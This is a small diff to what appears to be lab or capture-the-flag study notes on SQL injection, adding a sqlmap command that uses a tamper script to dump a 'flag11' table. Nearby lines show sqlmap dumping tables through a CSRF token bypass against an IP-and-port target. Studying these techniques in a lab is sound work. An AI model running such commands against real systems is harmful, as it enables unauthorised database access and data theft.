@@ -16,6 +16,9 @@ sqlmap -u "http://154.57.164.82:30425/case1.php?id=1" -D testdb -T users -C name
 # CSRF bypass
 # Craft POST request manually like id=1&token=12347 in req.txt
 sqlmap -r req.txt --csrf-token="t0ken" --batch -D testdb -T flag8 --dump
+
+# using tamper script
+sqlmap -r req.txt -p "id" --batch -D testdb -T flag11 --dump --tamper=between --flush-session --no-cast
 ```
 
 ## HTTP Request Type
